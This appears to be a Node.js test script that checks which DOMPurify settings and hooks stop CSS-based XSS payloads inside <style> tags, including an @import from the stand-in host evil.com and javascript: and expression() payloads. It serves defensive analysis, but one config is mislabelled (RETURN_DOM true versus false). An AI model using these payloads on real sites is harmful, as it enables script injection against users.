"use strict";
/**
 * Test DOMPurify CSS injection mitigations
 * Check which configurations effectively block CSS injection in <style> elements
 */
const path = require("path");
const { JSDOM } = require("jsdom");
const window = new JSDOM("").window;
const DOMPurify = require("dompurify")(window);
const TARGETS_DIR = path.resolve(__dirname, "..", "..", "targets");

const PAYLOAD = '<svg><style>*{background:url(javascript:alert(1))}</style></svg>';
const PAYLOAD2 = '<table><style>@import "//evil.com/xss.css"</style></table>';
const PAYLOAD3 = '<svg><style>*{x:expression(alert(1))}</style></svg>';

const CONFIGS = [
  ["Default", {}],
  ["FORCE_BODY: true", { FORCE_BODY: true }],
  ["SAFE_FOR_TEMPLATES: true", { SAFE_FOR_TEMPLATES: true }],
  ["RETURN_DOM: true", { RETURN_DOM: false }],
  ["FORBID_TAGS: ['style']", { FORBID_TAGS: ["style"] }],
  ["FORBID_TAGS: ['svg']", { FORBID_TAGS: ["svg"] }],
  ["FORBID_TAGS: ['svg','style']", { FORBID_TAGS: ["svg", "style"] }],
  ["ALLOWED_TAGS: safe subset", { ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "br", "ul", "ol", "li", "h1", "h2", "h3", "div", "span", "img"] }],
  ["FORBID_CONTENTS: {style: true}", { FORBID_CONTENTS: { style: true } }],
  ["ALLOW_DATA_ATTR: false", { ALLOW_DATA_ATTR: false }],
  ["USE_PROFILES: {html: true}", { USE_PROFILES: { html: true } }],
  ["USE_PROFILES: {svg: true}", { USE_PROFILES: { svg: true } }],
  ["USE_PROFILES: {svgFilters: true}", { USE_PROFILES: { svgFilters: true } }],
  ["SANITIZE_DOM: true (default)", { SANITIZE_DOM: true }],
  ["WHOLE_DOCUMENT: true", { WHOLE_DOCUMENT: true }],
  ["ADD_TAGS: [] (empty)", { ADD_TAGS: [] }],
];

// Add hook-based mitigation
const hookConfig = { _hookTest: true };

console.log("=" .repeat(80));
console.log("DOMPurify CSS Injection Mitigation Analysis");
console.log("=" .repeat(80));

for (const [name, config] of CONFIGS) {
  console.log(`\n--- Config: ${name} ---`);
  for (const [label, payload] of [["SVG url(js)", PAYLOAD], ["TABLE @import", PAYLOAD2], ["SVG expr()", PAYLOAD3]]) {
    const output = DOMPurify.sanitize(payload, config);
    const hasStyle = /<style[\s>]/i.test(output);
    const hasDanger = /javascript:|expression\(|@import/i.test(output);
    const status = hasDanger ? "[VULNERABLE]" : hasStyle ? "[style present, no danger]" : "[SAFE]";
    console.log(`  ${label}: ${status} → ${output.slice(0, 80)}`);
  }
}

// Test hook-based mitigation
console.log("\n" + "=" .repeat(80));
console.log("HOOK-BASED MITIGATION TEST");
console.log("=" .repeat(80));

console.log("\n--- Using DOMPurify.addHook to strip CSS ---");

// Reset hooks
DOMPurify.removeAllHooks();

// Add a hook to sanitize CSS content
DOMPurify.addHook("uponSanitizeElement", (node, data) => {
  if (data.tagName === "style") {
    const css = node.textContent || "";
    // Block dangerous CSS patterns
    if (/expression\s*\(|javascript\s*:|vbscript\s*:|-moz-binding|behavior\s*:|@import|url\s*\(\s*['"]*\s*(javascript|vbscript|data\s*:)/i.test(css)) {
      node.textContent = "/* sanitized */";
    }
  }
});

for (const [label, payload] of [["SVG url(js)", PAYLOAD], ["TABLE @import", PAYLOAD2], ["SVG expr()", PAYLOAD3]]) {
  const output = DOMPurify.sanitize(payload);
  const hasDanger = /javascript:|expression\(|@import/i.test(output);
  console.log(`  ${label}: ${hasDanger ? "[STILL VULNERABLE]" : "[MITIGATED]"} → ${output.slice(0, 80)}`);
}

DOMPurify.removeAllHooks();

// Check version
const pkg = require(path.join(TARGETS_DIR, "node_modules", "dompurify", "package.json"));
console.log(`\nDOMPurify version: ${pkg.version}`);
console.log("\nSUMMARY:");
console.log("- Default config: VULNERABLE to CSS injection via <style> in SVG/table");
console.log("- SAFE_FOR_TEMPLATES: VULNERABLE (does not affect CSS content)");
console.log("- FORCE_BODY: VULNERABLE (does not affect CSS content)");
console.log("- FORBID_TAGS: ['style']: SAFE (removes style tags entirely)");
console.log("- ALLOWED_TAGS whitelist: SAFE if style not included");
console.log("- USE_PROFILES: {html: true}: Check above");
console.log("- Hook-based CSS sanitization: Effective mitigation");
